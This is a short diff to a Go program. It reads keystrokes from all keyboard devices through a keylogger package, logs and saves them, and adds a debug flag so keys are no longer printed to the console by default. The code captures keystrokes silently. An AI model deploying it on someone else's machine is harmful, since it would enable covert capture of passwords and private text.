@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/json"
+	"flag"
 	"fmt"
 	"os"
 	"path/filepath"
@@ -97,6 +98,9 @@ func ensureStateDir() error {
 }
 
 func main() {
+	debug := flag.Bool("debug", false, "enable debug output")
+	flag.Parse()
+
 	ensureStateDir()
 
 	device := keylogger.FindAllKeyboardDevices()
@@ -119,7 +123,9 @@ func main() {
 	for {
 		select {
 		case key := <-keys:
-			fmt.Println(key)
+			if *debug {
+				fmt.Println(key)
+			}
 			log.log(key)
 		case <-timer:
 			log.save()
